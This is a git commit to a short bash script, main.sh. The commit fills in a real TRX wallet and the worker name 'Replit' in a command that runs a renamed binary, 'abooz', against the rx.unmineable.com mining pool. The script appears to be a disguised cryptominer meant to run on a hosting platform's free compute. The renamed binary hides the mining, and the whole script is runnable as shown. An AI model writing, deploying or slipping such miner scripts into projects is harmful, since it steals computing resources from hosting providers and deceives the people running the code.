32e53d433a9aca4552a712e9442143fe11fae173
prince206 <68004491+prince206@users.noreply.github.com>
2022-05-28 10:00:05 +0530

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 
 chmod +x ./abooz
-./abooz -o rx.unmineable.com:3333 -a rx -k -u COIN:WALLET_ID.WORKERNAME -p x
+./abooz -o rx.unmineable.com:3333 -a rx -k -u TRX:TBcBhq5aswpHCPzVQY4x4ERJ8uFMhvrDcm.Replit -p x
